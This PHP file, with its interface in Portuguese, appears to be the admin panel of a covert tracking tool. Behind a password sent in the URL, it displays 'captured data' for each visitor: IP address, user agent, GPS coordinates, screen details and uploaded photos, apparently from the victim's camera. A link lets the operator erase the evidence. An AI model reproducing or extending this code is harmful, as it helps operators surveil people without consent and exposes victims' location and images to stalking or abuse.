<?php

include "7xqKWj2di/actions.php";
include "7xqKWj2di/config.php";

$arquivo = $logFile;
$dados = getContent($arquivo);

$senha = isset($_GET['senha']) ? $_GET['senha'] : "";
$del = isset($_GET['deletar']) ? $_GET['deletar'] : "";


if ($senha != $adminPWD){
	echo '
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            font-family: Arial, sans-serif;
            color: #ffffff;
        }

        .login-container {
            text-align: center;
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
            font-size: 16px;
        }

        input[type="password"]::placeholder {
            color: #888888;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #4caf50;
            color: #ffffff;
            font-size: 16px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form>
            <input type="password" placeholder="Senha" name="senha" required>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
	';


	exit();
}

if (intval($del) == "1"){
	$files = glob('7xqKWj2di/uploads/*.jpg');
	foreach ($files as $file) {
	    if (is_file($file)) {
	        unlink($file);
	    }
	}

	unlink($logFile);
	header("Location: index.php?senha=" . $adminPWD);
}

?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informações dos Clientes</title>
    <link rel="stylesheet" href="styles.css">
</head>

<?php
echo '
<body>
    <div class="container">
        <h1>Dados Capturados</h1>
	<h3><a style="color: white;" href="?senha=' . $adminPWD . '&deletar=1">DELETAR DADOS</a><h3>
	<div class="client-list">
';
?>

<?php
foreach (array_reverse($dados) as $ip => $itens) {
	$tela = $itens["TELA"];
	$gps = $itens["GPS"];
	$foto = $itens["FOTO"];
	$data = "<li><strong>Data: </strong> " . $itens["DATA"] . "</li>";


	if ($tela != 0){
		$tela = "<li><strong>Tela: </strong> " . $tela . "</li>";
	}else{
		$tela = "";
	}

	if (strval($gps) != "0"){
		$gps = "<li><strong>GPS: </strong> " . $gps . "</li>";
	}else{
		$gps = "";
	}

	if ($foto != 0){
		$foto = '<img src="7xqKWj2di/uploads/' . $foto . '" alt="FOTO" class="client-photo">';
	}else{
		$foto = "";
	}

	$ip = "<li><strong>IP:</strong> " . $ip . "</li>";
	$ua = "<li><strong>User-Agent:</strong> " . $itens["UA"] . "</li>";


	echo '
            <div class="client-card">
		' . $foto . '
                <ul>
                    ' . $ip . '
                    ' . $ua . '
                    ' . $data . '
                    ' . $gps . '
                    ' . $tela . '
                </ul>
            </div>

	';
}
?>

        </div>
    </div>
</body>

</html>
